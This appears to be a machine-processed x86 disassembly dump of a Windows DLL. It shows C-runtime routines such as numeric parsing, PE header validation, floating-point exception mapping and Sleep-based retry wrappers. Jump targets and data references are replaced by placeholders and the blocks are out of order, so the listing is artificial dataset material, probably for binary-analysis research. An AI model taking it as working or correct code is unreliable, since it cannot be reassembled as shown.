je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x19f ] al
cmp al [ ebp - 0x188 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1a4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov [ ebp - 0x1b8 ] esi
mov esi [ ebp - 0x1bc ]
jmp r-xdata
mov al [ ebp - 0x188 ]
mov ecx [ ebp - 0x1ac ]
inc [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100144cb
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
inc bl
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
movzx eax al
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_10014558
cmp [ ebp - 0x1a8 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x188 ] 0x65
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov ecx [ ebp - 0x1ac ]
mov [ ebp - 0x188 ] eax
mov al [ ebp - 0x19f ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100144cb
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
mov eax [ ebp - 0x1ac ]
inc [ ebp - 0x1c4 ]
lea ecx [ ebp - 0x1f8 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x195 ]
dec eax
push eax
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100144cb
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_1000d9f3
pop ecx
test eax eax
jne r-xdata
xor dl dl
jmp r-xdata
sub al dl
inc al
movzx edi dl
movzx edx al
cmp dl al
ja r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_100144cb
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100144cb
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
movzx eax al
push eax
call sub_1000d9f3
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
and [ ebp - 0x194 ] eax
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_100144cb
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014542
mov [ ebp - 0x188 ] eax
movzx eax al
sub_10015552
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_1000d1a7
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_1000ecdb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_10015bb6
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1000ecdb
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_10015781
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10015552
add esp 0x14
pop ebp
retn
sub_100157b0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_100157f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10015840
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000ed80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_100157b0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100157f0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100158fd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_10013e6b
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_10015a5d
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_100158fd
pop ecx
pop ecx
pop ebp
retn
sub_10015a7d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1000cfb2
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_10015ac2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019294
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10015b0e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000df42
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10015b5c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100193b2
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10015bb6
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1000d1a7
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10017da6
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10018d5b
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10015c6e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10015c88
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_10015db3
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1001942d
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_10015db3
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1001647b ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1001aa22
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
